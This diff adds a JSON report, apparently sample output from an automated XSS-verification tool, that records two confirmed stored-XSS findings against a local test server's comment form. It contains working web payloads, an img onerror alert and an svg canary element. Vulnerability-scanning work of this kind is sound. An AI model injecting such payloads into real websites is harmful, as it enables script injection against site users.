@@ -1,0 +1,61 @@
+{
+  "module": "xss_verifier",
+  "target_url": "http://127.0.0.1:50698/feedback",
+  "verify_url": "http://127.0.0.1:50698/comments",
+  "summary": {
+    "total_cases": 2,
+    "confirmed_count": 2
+  },
+  "findings": [
+    {
+      "target_url": "http://127.0.0.1:50698/feedback",
+      "verify_url": "http://127.0.0.1:50698/comments",
+      "final_url": "http://127.0.0.1:50698/comments",
+      "input_selector": "#comment-input",
+      "payload": "<img src=\"x\" onerror=\"alert('StoredXSS')\">",
+      "confirmed": true,
+      "detection_methods": [
+        "dialog_event",
+        "dom_mutation"
+      ],
+      "dialogs": [
+        {
+          "type": "alert",
+          "message": "StoredXSS"
+        }
+      ],
+      "dom_mutations": [
+        {
+          "tag": "img",
+          "id": null,
+          "reason": "inline_js_attribute:onerror=alert('StoredXSS')",
+          "outer_html": "<img src=\"x\" onerror=\"alert('StoredXSS')\">"
+        }
+      ],
+      "screenshot": "C:\\Users\\acer\\Downloads\\vulnstrike_ai\\vulnstrike\\sample_outputs\\screenshots\\xss_001_comment-input_20261024T113550Z.png",
+      "error": null
+    },
+    {
+      "target_url": "http://127.0.0.1:50698/feedback",
+      "verify_url": "http://127.0.0.1:50698/comments",
+      "final_url": "http://127.0.0.1:50698/comments",
+      "input_selector": "#comment-input",
+      "payload": "<svg id=\"xss-canary\" data-xss=\"1\"></svg>",
+      "confirmed": true,
+      "detection_methods": [
+        "dom_mutation"
+      ],
+      "dialogs": [],
+      "dom_mutations": [
+        {
+          "tag": "svg",
+          "id": "xss-canary",
+          "reason": "dangerous_element:svg",
+          "outer_html": "<svg id=\"xss-canary\" data-xss=\"1\"></svg>"
+        }
+      ],
+      "screenshot": "C:\\Users\\acer\\Downloads\\vulnstrike_ai\\vulnstrike\\sample_outputs\\screenshots\\xss_002_comment-input_20261024T113552Z.png",
+      "error": null
+    }
+  ]
+}
